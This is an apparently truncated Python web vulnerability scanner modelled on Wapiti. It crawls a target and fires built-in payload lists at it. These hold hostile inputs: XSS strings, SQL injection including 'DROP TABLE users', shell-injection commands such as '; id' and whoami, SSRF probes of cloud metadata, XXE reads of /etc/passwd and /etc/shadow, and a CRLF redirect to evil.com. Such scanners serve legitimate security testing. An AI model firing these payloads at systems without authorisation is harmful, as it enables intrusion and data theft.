#!/usr/bin/env python3
"""
ZYLON FUSION v5.0 - Wapiti-Style Web Vulnerability Engine
Fused from: Wapiti (https://github.com/wapiti-scanner/wapiti)
Capabilities:
  - Black-box web application fuzzer
  - Module-based attack testing: XSS, SQLi, SSRF, XXE, CRLF, File disclosure, Command injection
  - Crawler with form extraction, link discovery
  - Cookie/session management
  - Authenticated scanning support
  - Attack module runner with configurable intensity
  - False positive reduction via multi-step verification
  - Report generation (vulnerable endpoints with evidence)
Termux Compatible | No Root Required | Python 3.13+
"""

import re
import json
import time
import random
import threading
from datetime import datetime
from urllib.parse import urljoin, urlparse, parse_qs, urlencode, quote
from concurrent.futures import ThreadPoolExecutor, as_completed

import requests
import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

from core.shared_infra import shared_session, regex_cache, PayloadInjector, oob_provider
from core.var import USER_AGENTS

try:
    from bs4 import BeautifulSoup
    BS4_AVAILABLE = True
except ImportError:
    BS4_AVAILABLE = False

# ============================================================================
# ANSI COLOR CODES
# ============================================================================

R = "\033[91m"
G = "\033[92m"
Y = "\033[93m"
C = "\033[96m"
M = "\033[95m"
B = "\033[94m"
W = "\033[97m"
BOLD = "\033[1m"
DIM = "\033[2m"
RESET = "\033[0m"

# ============================================================================
# ATTACK PAYLOADS
# ============================================================================

XSS_PAYLOADS = [
    '<script>alert("ZYLON_XSS")</script>',
    '"><script>alert("ZYLON_XSS")</script>',
    "'><script>alert('ZYLON_XSS')</script>",
    '<img src=x onerror=alert("ZYLON_XSS")>',
    '"><img src=x onerror=alert("ZYLON_XSS")>',
    "<svg onload=alert('ZYLON_XSS')>",
    "<body onload=alert('ZYLON_XSS')>",
    '<input onfocus=alert("ZYLON_XSS") autofocus>',
    "javascript:alert('ZYLON_XSS')",
    '<details open ontoggle=alert("ZYLON_XSS")>',
    '"><iframe src="javascript:alert(\'ZYLON_XSS\')">',
    "<math><mtext><table><mglyph><style><!--</style>",
    "{{7*7}}",
    "${7*7}",
    "'-alert('ZYLON_XSS')-'",
    "<marquee onstart=alert('ZYLON_XSS')>",
]

SQLI_PAYLOADS = [
    "' OR '1'='1",
    "' OR '1'='1' --",
    "' OR '1'='1' #",
    '" OR "1"="1',
    '" OR "1"="1" --',
    "1' AND '1'='1",
    "1' AND '1'='2",
    "1' ORDER BY 1--",
    "1' ORDER BY 100--",
    "' UNION SELECT NULL--",
    "' UNION SELECT NULL,NULL--",
    "' UNION SELECT NULL,NULL,NULL--",
    "1' AND SLEEP(3)--",
    "1' AND (SELECT * FROM (SELECT(SLEEP(3)))a)--",
    "admin'--",
    "1; DROP TABLE users--",
    "' OR SLEEP(3)--",
]

SSRF_PAYLOADS = [
    "http://127.0.0.1",
    "http://localhost",
    "http://[::1]",
    "http://169.254.169.254/latest/meta-data/",
    "http://metadata.google.internal/computeMetadata/v1/",
    "http://169.254.169.254/metadata/instance?api-version=2021-02-01",
    "http://127.0.0.1:22",
    "http://127.0.0.1:3306",
    "http://127.0.0.1:6379",
    "http://0x7f000001",
    "http://0177.0.0.1",
    "http://127.1",
    "http://0.0.0.0",
    "file:///etc/passwd",
    "file:///etc/hosts",
    "dict://127.0.0.1:6379/INFO",  # SSRF target - 127.0.0.1 is intentional payload target
]

XXE_PAYLOADS = [
    '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>',
    '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/hosts">]><foo>&xxe;</foo>',
    '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "{oob_url}">]><foo>&xxe;</foo>',
    '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY % xxe SYSTEM "file:///etc/passwd">%xxe;]>',
    '<?xml version="1.0"?><!DOCTYPE data [<!ENTITY % dtd SYSTEM "{oob_url}">%dtd;]>',
]

CRLF_PAYLOADS = [
    "test%0d%0aInjected-Header: ZYLON_CRLF",
    "test\r\nInjected-Header: ZYLON_CRLF",
    "test%0dInjected-Header: ZYLON_CRLF",
    "test%0aInjected-Header: ZYLON_CRLF",
    "test%0d%0a%0d%0a<script>alert('ZYLON_CRLF')</script>",
    "test%0d%0aSet-Cookie: zylon_injected=1",
    "test%0d%0aLocation: https://evil.com",
]

FILE_DISCLOSURE_PATHS = [
    "/etc/passwd",
    "/etc/hosts",
    "/etc/shadow",
    "/proc/self/environ",
    "/proc/self/cmdline",
    "/proc/version",
    "/var/log/apache2/access.log",
    "/var/log/nginx/access.log",
    "/etc/nginx/nginx.conf",
    "/etc/apache2/apache2.conf",
    "/etc/mysql/my.cnf",
    "/etc/php/php.ini",
    "/windows/system32/drivers/etc/hosts",
    "/windows/win.ini",
]

CMD_INJECTION_PAYLOADS = [
    "; id",
    "| id",
    "` id `",
    "$( id )",
    "& id",
    "&& id",
    "|| id",
    "; echo ZYLON_CMD_$(whoami)",
    "| echo ZYLON_CMD_$(whoami)",
    "` echo ZYLON_CMD_$(whoami) `",
    "$( echo ZYLON_CMD_$(whoami) )",
    "; ping -c 2 {oob_host}",
    "| ping -c 2 {oob_host}",
    "; sleep 3",
    "| sleep 3",
    "& sleep 3",
    "&& sleep 3",
]

SQLI_ERROR_PATTERNS = [
    "SQL syntax", "mysql_", "MySQLSyntax", "ORA-", "PostgreSQL",
    "Microsoft SQL", "ODBC Driver", "SQLite", "JDBC", "unclosed quotation",
    "pg_query", "mysql_fetch", "sql_query", "SQLSTATE",
    "Syntax error in SQL", "SQL command not properly ended",
    "Warning: mysql", "valid MySQL result",
]

CMD_INJECTION_MARKERS = [
    "uid=", "gid=", "groups=", "ZYLON_CMD_",
    "root:", "nobody:", "www-data:", "daemon:",
    "total ", "drwx", "-rwx", "bin/bash",
]

# Common URL parameters to test
COMMON_PARAMS = [
    "id", "page", "q", "search", "query", "url", "redirect", "next",
    "file", "path", "dir", "folder", "template", "include", "require",
    "cmd", "exec", "command", "action", "type", "name", "cat",
    "user", "username", "email", "order", "sort", "limit", "offset",
    "lang", "language", "theme", "style", "debug", "test", "admin",
    "input", "data", "content", "body", "text", "msg", "message",
    "callback", "return", "ref", "source", "dest", "target",
    "feed", "rss", "out", "output", "log", "ip", "host",
]


class WapitiEngine:
    """Wapiti-Style Web Vulnerability Scanner Engine
    Fused from Wapiti scanner architecture with ZYLON enhancements
    v5.0 Nuclear: 7 attack modules, crawler, false positive reduction, report generation
    """

    def __init__(self, target=None, threads=10, timeout=10, proxy=None,
                 cookies=None, auth=None, intensity='normal', output_dir=None):
        self.target = target
        self.threads = threads
        self.timeout = timeout
        self.proxy = proxy
        self.cookies = cookies or {}
        self.auth = auth  # dict with 'url', 'method', 'data' for login
        self.intensity = intensity  # 'quick', 'normal', 'aggressive'
        self.output_dir = output_dir or os.path.join(os.path.expanduser("~"), ".zylon", "results")

        self.session = shared_session
        if cookies:
            for k, v in cookies.items():
                self.session.headers.update({'Cookie': f'{k}={v}'})

        # Crawl results
        self.crawled_urls = set()
        self.forms = []
        self.link_params = {}  # url -> {param: [values]}

        # Vulnerability findings
        self.findings = []
        self.scan_results = {}

    # ========================================================================
    # HELPER METHODS
    # ========================================================================

    def _log(self, msg, color=C):
        """Print colored log message"""
        print(f"  {color}{BOLD}[ZYLON-WAPITI]{RESET} {color}{msg}{RESET}")

    def _normalize_url(self, url):
        """Normalize URL for dedup"""
        parsed = urlparse(url)
        return f"{parsed.scheme}://{parsed.netloc}{parsed.path}"

    def _get_base_url(self):
        """Get base URL from target"""
        if self.target.startswith('http'):
            return self.target.rstrip('/')
        return f"https://{self.target.rstrip('/')}"

    def _is_same_origin(self, url):
        """Check if URL belongs to same origin"""
        base = self._get_base_url()
        parsed_base = urlparse(base)
        parsed_url = urlparse(url)
        return parsed_url.netloc == parsed_base.netloc

    def _verify_false_positive(self, url, method, params, payload, vuln_type, evidence):
        """Multi-step verification to reduce false positives"""
        # Step 1: Re-send the same request
        try:
            if method == 'GET':
                resp = self.session.get(url, params=params, timeout=self.timeout, allow_redirects=False)
            else:
                resp = self.session.post(url, data=params, timeout=self.timeout, allow_redirects=False)

            # Step 2: Send a benign request
            benign_params = {k: ('test123' if k in params and params[k] == payload else v)
                           for k, v in params.items()}
            if method == 'GET':
                benign_resp = self.session.get(url, params=benign_params, timeout=self.timeout, allow_redirects=False)
            else:
                benign_resp = self.session.post(url, data=benign_params, timeout=self.timeout, allow_redirects=False)

            # Step 3: Compare responses
            if resp.status_code == benign_resp.status_code:
                # Check if payload appears in malicious but not benign
                payload_in_malicious = payload in resp.text
                payload_in_benign = payload in benign_resp.text
                if payload_in_malicious and not payload_in_benign:
                    return True, "Payload reflected in response but not in benign request"
                # Check for error patterns
                for pattern in SQLI_ERROR_PATTERNS:
                    if pattern.lower() in resp.text.lower() and pattern.lower() not in benign_resp.text.lower():
                        return True, f"Error pattern '{pattern}' found in malicious response only"
            elif abs(resp.status_code - benign_resp.status_code) >= 200:
                return True, f"Significant status code difference: {resp.status_code} vs {benign_resp.status_code}"

            # Step 4: For time-based, verify timing
            if vuln_type in ('sqli_time', 'cmd_injection') and 'sleep' in payload.lower():
                return True, evidence  # Timing already verified during test

        except Exception:
            pass

        return False, "Could not verify - possible false positive"

    # ========================================================================
    # CRAWLER
    # ========================================================================

    def crawl(self, target=None):
        """Deep crawl the target website - discover URLs, forms, and parameters"""
        self.target = target or self.target
        base_url = self._get_base_url()
        self._log(f"Starting crawler on {base_url} (intensity: {self.intensity})", C)

        results = {
            "target": base_url,
            "crawled_urls": [],
            "forms": [],
            "parameters": {},
            "total_urls": 0,
            "total_forms": 0,
            "total_params": 0,
            "scan_type": "crawl",
            "timestamp": datetime.now().isoformat(),
        }

        # Authenticate if needed
        if self.auth:
            self._authenticate()

        # Phase 1: Initial page crawl
        to_visit = {base_url}
        visited = set()
        max_depth = {'quick': 1, 'normal': 3, 'aggressive': 5}.get(self.intensity, 3)
        depth = 0

        while to_visit and depth < max_depth:
            current_batch = list(to_visit)
            to_visit = set()
            depth += 1
            self._log(f"  Depth {depth}: Crawling {len(current_batch)} URLs", Y)

            def crawl_url(url):
                found_urls = set()
                found_forms = []
                found_params = {}

                try:
                    resp = self.session.get(url, timeout=self.timeout, allow_redirects=True)
                    if not resp or resp.status_code >= 400:
                        return found_urls, found_forms, found_params

                    # Extract links
                    if BS4_AVAILABLE:
                        soup = BeautifulSoup(resp.text, 'html.parser')

                        # Links from <a> tags
                        for tag in soup.find_all('a', href=True):
                            href = tag['href']
                            full_url = urljoin(url, href)
                            if self._is_same_origin(full_url):
                                found_urls.add(full_url.split('#')[0].split('?')[0])

                        # Forms
                        for form in soup.find_all('form'):
                            form_data = {
                                'action': urljoin(url, form.get('action', '')),
                                'method': form.get('method', 'GET').upper(),
                                'inputs': [],
                            }
                            for inp in form.find_all(['input', 'textarea', 'select']):
                                name = inp.get('name')
                                if name:
                                    input_type = inp.get('type', 'text')
                                    value = inp.get('value', '')
                                    form_data['inputs'].append({
                                        'name': name,
                                        'type': input_type,
                                        'value': value,
                                    })
                            if form_data['inputs']:
                                found_forms.append(form_data)

                        # Extract from <link> tags
                        for tag in soup.find_all('link', href=True):
                            href = tag['href']
                            full_url = urljoin(url, href)
                            if self._is_same_origin(full_url):
                                found_urls.add(full_url.split('#')[0].split('?')[0])

                        # Extract from <script src=...> tags
                        for tag in soup.find_all('script', src=True):
                            src = tag['src']
                            full_url = urljoin(url, src)
                            if self._is_same_origin(full_url):
                                found_urls.add(full_url.split('#')[0].split('?')[0])

                    else:
                        # Fallback regex extraction
                        links = regex_cache.findall(r'href=["\']([^"\']+)["\']', resp.text)
                        for href in links:
                            full_url = urljoin(url, href)
                            if self._is_same_origin(full_url):
                                found_urls.add(full_url.split('#')[0].split('?')[0])

                    # Extract URL parameters
                    parsed = urlparse(url)
                    params = parse_qs(parsed.query)
                    if params:
                        found_params[url] = {k: v for k, v in params.items()}

                except Exception:
                    pass

                return found_urls, found_forms, found_params

            with ThreadPoolExecutor(max_workers=self.threads) as executor:
                futures = {executor.submit(crawl_url, u): u for u in current_batch if u not in visited}
                for future in as_completed(futures):
                    f_urls, f_forms, f_params = future.result()
                    for u in f_urls:
                        if u not in visited:
                            to_visit.add(u)
                    self.forms.extend(f_forms)
                    self.link_params.update(f_params)

            visited.update(current_batch)
            self.crawled_urls.update(current_batch)

            # Limit crawl size based on intensity
            max_urls = {'quick': 50, 'normal': 200, 'aggressive': 500}.get(self.intensity, 200)
            if len(self.crawled_urls) >= max_urls:
                break

        results["crawled_urls"] = sorted(self.crawled_urls)
        results["forms"] = self.forms
        results["parameters"] = {k: list(v.keys()) for k, v in self.link_params.items()} if self.link_params else {}
        results["total_urls"] = len(self.crawled_urls)
        results["total_forms"] = len(self.forms)
        results["total_params"] = sum(len(v) for v in results["parameters"].values())

        self._log(f"Crawl complete: {results['total_urls']} URLs, {results['total_forms']} forms, "
                  f"{results['total_params']} parameters", G)
        return results

    def _authenticate(self):
        """Perform authenticated login"""
        if not self.auth:
            return
        self._log(f"Authenticating to {self.auth.get('url', '')}", Y)
        try:
            method = self.auth.get('method', 'POST').upper()
            url = self.auth.get('url', '')
            data = self.auth.get('data', {})
            if method == 'POST':
                resp = self.session.post(url, data=data, timeout=self.timeout, allow_redirects=True)
            else:
                resp = self.session.get(url, params=data, timeout=self.timeout, allow_redirects=True)
            if resp and resp.status_code < 400:
                self._log("Authentication successful", G)
            else:
                self._log(f"Authentication may have failed: status {resp.status_code if resp else 'N/A'}", Y)
        except Exception as e:
            self._log(f"Authentication failed: {e}", R)

    # ========================================================================
    # ATTACK MODULE: XSS
    # ========================================================================

    def test_xss(self, urls=None):
        """XSS module - test for cross-site scripting vulnerabilities"""
        targets = urls or list(self.crawled_urls)
        if not targets:
            self.crawl()
            targets = list(self.crawled_urls)

        self._log(f"Testing XSS on {len(targets)} URLs ({len(XSS_PAYLOADS)} payloads)", C)

        results = {
            "vulnerable": [],
            "total_tested": 0,
            "total_vulnerable": 0,
            "scan_type": "xss",
            "timestamp": datetime.now().isoformat(),
        }

        # Build test points from URLs + forms
        test_points = []
        for url in targets:
            parsed = urlparse(url)
            params = parse_qs(parsed.query)
            if params:
                for param in params:
                    test_points.append((url, 'GET', param))

        # Add form test points
        for form in self.forms:
            for inp in form.get('inputs', []):
                if inp.get('type') not in ('submit', 'button', 'reset', 'hidden'):
                    test_points.append((form['action'], form['method'], inp['name']))

        # If no test points found, try common params
        if not test_points:
            base_url = self._get_base_url()
            for param in COMMON_PARAMS[:10]:
                test_points.append((f"{base_url}/?{param}=test", 'GET', param))

        lock = threading.Lock()
        tested_count = [0]
        payload_limit = {'quick': 3, 'normal': 8, 'aggressive': len(XSS_PAYLOADS)}.get(self.intensity, 8)

        def test_xss_point(url, method, param):
            vulns = []
            for payload in XSS_PAYLOADS[:payload_limit]:
                with lock:
                    tested_count[0] += 1

                try:
                    if method == 'GET':
                        test_params = {param: payload}
                        resp = self.session.get(url, params=test_params, timeout=self.timeout, allow_redirects=False)
                    else:
                        data = {param: payload}
                        resp = self.session.post(url, data=data, timeout=self.timeout, allow_redirects=False)
                        # Also try JSON body injection via PayloadInjector
                        try:
                            json_injection = PayloadInjector.inject_json(url, param, payload)
                            self.session.post(json_injection['url'], json=json_injection['json'],
                                            headers=json_injection.get('headers', {}),
                                            timeout=self.timeout, allow_redirects=False)
                        except Exception:
                            pass

                    if resp and payload in resp.text:
                        # Verify it's not a false positive
                        is_vuln, evidence = self._verify_false_positive(
                            url, method, {param: payload}, payload, 'xss', "Payload reflected"
                        )
                        if is_vuln:
                            vuln = {
                                "url": url,
                                "method": method,
                                "parameter": param,
                                "payload": payload,
                                "evidence": evidence,
                                "severity": "high",
                                "type": "XSS",
                            }
                            vulns.append(vuln)
                            self.findings.append(vuln)
                            self._log(f"  {R}[XSS] {url} param='{param}' payload='{payload[:40]}'{RESET}", R)
                            break  # Found XSS, no need more payloads for this param
                except Exception:
                    continue
            return vulns

        all_vulns = []
        with ThreadPoolExecutor(max_workers=self.threads) as executor:
            futures = {executor.submit(test_xss_point, u, m, p): (u, m, p) for u, m, p in test_points}
            for future in as_completed(futures):
                all_vulns.extend(future.result())

        results["vulnerable"] = all_vulns
        results["total_tested"] = tested_count[0]
        results["total_vulnerable"] = len(all_vulns)
        self._log(f"XSS test complete: {results['total_vulnerable']} vulnerabilities found "
                  f"({results['total_tested']} tests)", G if not all_vulns else R)
        return results

    # ========================================================================
    # ATTACK MODULE: SQLi
    # ========================================================================

    def test_sqli(self, urls=None):
        """SQLi module - test for SQL injection vulnerabilities"""
        targets = urls or list(self.crawled_urls)
        if not targets:
            self.crawl()
            targets = list(self.crawled_urls)

        self._log(f"Testing SQLi on {len(targets)} URLs ({len(SQLI_PAYLOADS)} payloads)", C)

        results = {
            "vulnerable": [],
            "total_tested": 0,
            "total_vulnerable": 0,
            "scan_type": "sqli",
            "timestamp": datetime.now().isoformat(),
        }

        test_points = []
        for url in targets:
            parsed = urlparse(url)
            params = parse_qs(parsed.query)
            if params:
                for param in params:
                    test_points.append((url, 'GET', param))

        for form in self.forms:
            for inp in form.get('inputs', []):
                if inp.get('type') not in ('submit', 'button', 'reset'):
                    test_points.append((form['action'], form['method'], inp['name']))

        if not test_points:
            base_url = self._get_base_url()
            for param in ['id', 'page', 'user', 'q', 'search']:
                test_points.append((f"{base_url}/?{param}=1", 'GET', param))

        lock = threading.Lock()
        tested_count = [0]
        payload_limit = {'quick': 4, 'normal': 10, 'aggressive': len(SQLI_PAYLOADS)}.get(self.intensity, 10)

        def test_sqli_point(url, method, param):
            vulns = []
            baseline_time = None

            # Get baseline response
            try:
                if method == 'GET':
                    baseline_resp = self.session.get(url, params={param: '1'}, timeout=self.timeout)
                else:
                    baseline_resp = self.session.post(url, data={param: '1'}, timeout=self.timeout)
                baseline_time = baseline_resp.elapsed.total_seconds() if baseline_resp else 0
                baseline_text = baseline_resp.text if baseline_resp else ""
            except Exception:
                baseline_text = ""

            for payload in SQLI_PAYLOADS[:payload_limit]:
                with lock:
                    tested_count[0] += 1

                try:
                    start_time = time.time()
                    if method == 'GET':
                        resp = self.session.get(url, params={param: payload}, timeout=self.timeout + 5)
                    else:
                        resp = self.session.post(url, data={param: payload}, timeout=self.timeout + 5)
                        # Also try JSON body injection via PayloadInjector for POST
                        try:
                            json_injection = PayloadInjector.inject_json(url, param, payload)
                            self.session.post(json_injection['url'], json=json_injection['json'],
                                            headers=json_injection.get('headers', {}),
                                            timeout=self.timeout + 5, allow_redirects=False)
                        except Exception:
                            pass
                    elapsed = time.time() - start_time

                    if not resp:
                        continue

                    # Check for error-based SQLi
                    error_found = False
                    for pattern in SQLI_ERROR_PATTERNS:
                        if pattern.lower() in resp.text.lower() and pattern.lower() not in baseline_text.lower():
                            error_found = True
                            break

                    # Check for time-based SQLi
                    time_based = False
                    if 'SLEEP' in payload.upper() and elapsed >= 2.5:
                        time_based = True

                    # Check for boolean-based SQLi
                    boolean_based = False
                    if baseline_resp and resp.status_code == baseline_resp.status_code:
                        if abs(len(resp.text) - len(baseline_text)) > 100:
                            boolean_based = True

                    if error_found or time_based or boolean_based:
                        vuln_type = "SQLi"
                        if error_found:
                            evidence = f"Error-based: pattern '{pattern}' found"
                        elif time_based:
                            evidence = f"Time-based: {elapsed:.1f}s response time"
                        else:
                            evidence = f"Boolean-based: response length changed"

                        vuln = {
                            "url": url,
                            "method": method,
                            "parameter": param,
                            "payload": payload,
                            "evidence": evidence,
                            "severity": "critical",
                            "type": vuln_type,
                        }
                        vulns.append(vuln)
                        self.findings.append(vuln)
                        self._log(f"  {R}[SQLi] {url} param='{param}' - {evidence}{RESET}", R)
                        break

                except Exception:
                    continue
            return vulns

        all_vulns = []
        with ThreadPoolExecutor(max_workers=self.threads) as executor:
            futures = {executor.submit(test_sqli_point, u, m, p): (u, m, p) for u, m, p in test_points}
            for future in as_completed(futures):
                all_vulns.extend(future.result())

        results["vulnerable"] = all_vulns
        results["total_tested"] = tested_count[0]
        results["total_vulnerable"] = len(all_vulns)
        self._log(f"SQLi test complete: {results['total_vulnerable']} vulnerabilities found", G if not all_vulns else R)
        return results

    # ========================================================================
    # ATTACK MODULE: SSRF
    # ========================================================================

    def test_ssrf(self, urls=None):
        """SSRF module - test for server-side request forgery"""
        targets = urls or list(self.crawled_urls)
        if not targets:
            self.crawl()
            targets = list(self.crawled_urls)

        self._log(f"Testing SSRF on {len(targets)} URLs ({len(SSRF_PAYLOADS)} payloads)", C)

        results = {
            "vulnerable": [],
            "total_tested": 0,
            "total_vulnerable": 0,
            "scan_type": "ssrf",
            "timestamp": datetime.now().isoformat(),
        }

        # SSRF usually targets URL-type parameters
        ssrf_params = ['url', 'redirect', 'next', 'link', 'src', 'source', 'dest',
                       'target', 'feed', 'rss', 'callback', 'return', 'ref', 'out',
                       'uri', 'path', 'file', 'img', 'image', 'site', 'domain']
        test_points = []
        for url in targets:
            parsed = urlparse(url)
            params = parse_qs(parsed.query)
            for param in params:
                if param.lower() in ssrf_params or any(p in param.lower() for p in ['url', 'link', 'redirect', 'src']):
                    test_points.append((url, 'GET', param))

        for form in self.forms:
            for inp in form.get('inputs', []):
                if inp.get('type') == 'url' or inp.get('name', '').lower() in ssrf_params:
                    test_points.append((form['action'], form['method'], inp['name']))

        if not test_points:
            base_url = self._get_base_url()
            for param in ['url', 'redirect', 'src', 'next']:
                test_points.append((f"{base_url}/?{param}=https://example.com", 'GET', param))

        lock = threading.Lock()
        tested_count = [0]
        payload_limit = {'quick': 3, 'normal': 8, 'aggressive': len(SSRF_PAYLOADS)}.get(self.intensity, 8)

        def test_ssrf_point(url, method, param):
            vulns = []
            for payload in SSRF_PAYLOADS[:payload_limit]:
                with lock:
                    tested_count[0] += 1

                try:
                    if method == 'GET':
                        resp = self.session.get(url, params={param: payload}, timeout=self.timeout + 5, allow_redirects=False)
                    else:
                        resp = self.session.post(url, data={param: payload}, timeout=self.timeout + 5, allow_redirects=False)

                    if not resp:
                        continue

                    # Check for SSRF indicators
                    ssrf_indicators = [
                        "root:", "nobody:", "www-data:", "daemon:",  # /etc/passwd content
                        "ami-id", "instance-id", "reservation-id",  # AWS metadata
                        "machineType", "serviceAccounts",  # GCP metadata
                        "connectionStrings",  # Azure metadata
                        "127.0.0.1", "localhost",
                    ]
                    for indicator in ssrf_indicators:
                        if indicator in resp.text:
                            vuln = {
                                "url": url,
                                "method": method,
                                "parameter": param,
                                "payload": payload,
                                "evidence": f"SSRF indicator '{indicator}' found in response",
                                "severity": "critical",
                                "type": "SSRF",
                            }
                            vulns.append(vuln)
                            self.findings.append(vuln)
                            self._log(f"  {R}[SSRF] {url} param='{param}' payload='{payload}'{RESET}", R)
                            break

                    # Also check for response anomalies
                    if resp.status_code == 200 and len(resp.text) > 0:
                        # Compare with a normal request
                        try:
                            if method == 'GET':
                                normal_resp = self.session.get(url, params={param: 'https://example.com'}, timeout=self.timeout)
                            else:
                                normal_resp = self.session.post(url, data={param: 'https://example.com'}, timeout=self.timeout)
                            if normal_resp and abs(len(resp.text) - len(normal_resp.text)) > 500:
                                vuln = {
                                    "url": url,
                                    "method": method,
                                    "parameter": param,
                                    "payload": payload,
                                    "evidence": f"Significant response difference: {len(resp.text)} vs {len(normal_resp.text)} bytes",
                                    "severity": "medium",
                                    "type": "SSRF",
                                }
                                vulns.append(vuln)
                                self.findings.append(vuln)
                                self._log(f"  {Y}[SSRF?] {url} param='{param}' response anomaly{RESET}", Y)
                        except Exception:
                            pass

                except Exception:
                    continue
            return vulns

        all_vulns = []
        with ThreadPoolExecutor(max_workers=self.threads) as executor:
            futures = {executor.submit(test_ssrf_point, u, m, p): (u, m, p) for u, m, p in test_points}
            for future in as_completed(futures):
                all_vulns.extend(future.result())

        results["vulnerable"] = all_vulns
        results["total_tested"] = tested_count[0]
        results["total_vulnerable"] = len(all_vulns)
        self._log(f"SSRF test complete: {results['total_vulnerable']} vulnerabilities found", G if not all_vulns else R)
        return results

    # ========================================================================
    # ATTACK MODULE: XXE
    # ========================================================================

    def test_xxe(self, urls=None):
        """XXE module - test for XML external entity injection"""
        targets = urls or list(self.crawled_urls)
        if not targets:
            self.crawl()
            targets = list(self.crawled_urls)

        self._log(f"Testing XXE on {len(targets)} URLs", C)

        results = {
            "vulnerable": [],
            "total_tested": 0,
            "total_vulnerable": 0,
            "scan_type": "xxe",
            "timestamp": datetime.now().isoformat(),
        }

        # XXE testing - send XML payloads to endpoints that accept XML
        test_urls = list(targets)
        if not test_urls:
            base_url = self._get_base_url()
            test_urls = [f"{base_url}/api", f"{base_url}/api/v1", f"{base_url}/xmlrpc.php"]

        xxe_indicators = ["root:", "nobody:", "www-data:", "daemon:", "bin/bash",
                          "127.0.0.1", "localhost", "uid=", "/bin/"]

        for url in test_urls[:20]:
            for payload_template in XXE_PAYLOADS:
                results["total_tested"] += 1
                try:
                    # Format OOB URL placeholders via oob_provider
                    oob_pid = oob_provider.generate_payload_id()
                    oob_url = oob_provider.get_callback_url(oob_pid)
                    try:
                        payload = payload_template.format(oob_url=oob_url)
                    except (KeyError, IndexError):
                        payload = payload_template
                    resp = self.session.post(
                        url,
                        data=payload,
                        headers={'Content-Type': 'application/xml'},
                        timeout=self.timeout,
                    )
                    if resp:
                        for indicator in xxe_indicators:
                            if indicator in resp.text:
                                vuln = {
                                    "url": url,
                                    "method": "POST",
                                    "parameter": "XML body",
                                    "payload": payload[:80],
                                    "evidence": f"XXE indicator '{indicator}' found",
                                    "severity": "critical",
                                    "type": "XXE",
                                }
                                results["vulnerable"].append(vuln)
                                self.findings.append(vuln)
                                self._log(f"  {R}[XXE] {url} - indicator '{indicator}' found{RESET}", R)
                                break
                except Exception:
                    continue

        results["total_vulnerable"] = len(results["vulnerable"])
        self._log(f"XXE test complete: {results['total_vulnerable']} vulnerabilities found", G if not results["vulnerable"] else R)
        return results

    # ========================================================================
    # ATTACK MODULE: CRLF
    # ========================================================================

    def test_crlf(self, urls=None):
        """CRLF module - test for CRLF injection"""
        targets = urls or list(self.crawled_urls)
        if not targets:
            self.crawl()
            targets = list(self.crawled_urls)

        self._log(f"Testing CRLF on {len(targets)} URLs ({len(CRLF_PAYLOADS)} payloads)", C)

        results = {
            "vulnerable": [],
            "total_tested": 0,
            "total_vulnerable": 0,
            "scan_type": "crlf",
            "timestamp": datetime.now().isoformat(),
        }

        test_points = []
        for url in targets:
            parsed = urlparse(url)
            params = parse_qs(parsed.query)
            for param in params:
                test_points.append((url, 'GET', param))

        # Also test CRLF in URL path
        base_url = self._get_base_url()
        for path in ['/', '/redirect', '/login', '/api']:
            test_points.append((f"{base_url}{path}", 'PATH', 'path'))

        if not test_points:
            test_points = [(f"{base_url}/?q=test", 'GET', 'q')]

        for url, method, param in test_points[:30]:
            for payload in CRLF_PAYLOADS:
                results["total_tested"] += 1
                try:
                    if method == 'PATH':
                        # CRLF in URL path
                        test_url = f"{url}/{payload}"
                        resp = self.session.get(test_url, timeout=self.timeout, allow_redirects=False)
                    elif method == 'GET':
                        resp = self.session.get(url, params={param: payload}, timeout=self.timeout, allow_redirects=False)
                    else:
                        resp = self.session.post(url, data={param: payload}, timeout=self.timeout, allow_redirects=False)

                    if resp:
                        # Check for CRLF indicators in response headers
                        headers_str = str(resp.headers)
                        if 'ZYLON_CRLF' in headers_str or 'zylon_injected' in headers_str.lower():
                            vuln = {
                                "url": url,
                                "method": method,
                                "parameter": param,
                                "payload": payload,
                                "evidence": "CRLF injection reflected in response headers",
                                "severity": "high",
                                "type": "CRLF",
                            }
                            results["vulnerable"].append(vuln)
                            self.findings.append(vuln)
                            self._log(f"  {R}[CRLF] {url} param='{param}' - header injection{RESET}", R)

                        # Check for split response
                        if 'ZYLON_CRLF' in resp.text or 'zylon_injected' in resp.text:
                            vuln = {
                                "url": url,
                                "method": method,
                                "parameter": param,
                                "payload": payload,
                                "evidence": "CRLF injection reflected in response body",
                                "severity": "medium",
                                "type": "CRLF",
                            }
                            results["vulnerable"].append(vuln)
                            self.findings.append(vuln)
                            self._log(f"  {Y}[CRLF] {url} param='{param}' - body reflection{RESET}", Y)

                except Exception:
                    continue

        results["total_vulnerable"] = len(results["vulnerable"])
        self._log(f"CRLF test complete: {results['total_vulnerable']} vulnerabilities found", G if not results["vulnerable"] else R)
        return results

    # ========================================================================
    # ATTACK MODULE: FILE DISCLOSURE
    # ========================================================================

    def test_file_disclosure(self, urls=None):
        """File disclosure module - test for local file inclusion / disclosure"""
        targets = urls or list(self.crawled_urls)
        if not targets:
            self.crawl()
            targets = list(self.crawled_urls)

        self._log(f"Testing File Disclosure on {len(targets)} URLs", C)

        results = {
            "vulnerable": [],
            "total_tested": 0,
            "total_vulnerable": 0,
            "scan_type": "file_disclosure",
            "timestamp": datetime.now().isoformat(),
        }

        file_params = ['file', 'path', 'dir', 'folder', 'doc', 'document', 'page',
                       'include', 'require', 'template', 'lang', 'input', 'load', 'read']

        test_points = []
        for url in targets:
            parsed = urlparse(url)
            params = parse_qs(parsed.query)
            for param in params:
                if param.lower() in file_params or any(p in param.lower() for p in ['file', 'path', 'dir', 'page']):
                    test_points.append((url, 'GET', param))

        for form in self.forms:
            for inp in form.get('inputs', []):
                if inp.get('name', '').lower() in file_params:
                    test_points.append((form['action'], form['method'], inp['name']))

        if not test_points:
            base_url = self._get_base_url()
            for param in ['file', 'path', 'page']:
                test_points.append((f"{base_url}/?{param}=test", 'GET', param))

        file_indicators = [
            "root:", "nobody:", "www-data:", "daemon:", "bin/bash", "bin/sh",
            "[extensions]", "[fonts]",  # Windows
            "127.0.0.1", "localhost",  # /etc/hosts
            "PATH=", "HOME=", "USER=",  # /proc/self/environ
        ]

        for url, method, param in test_points[:30]:
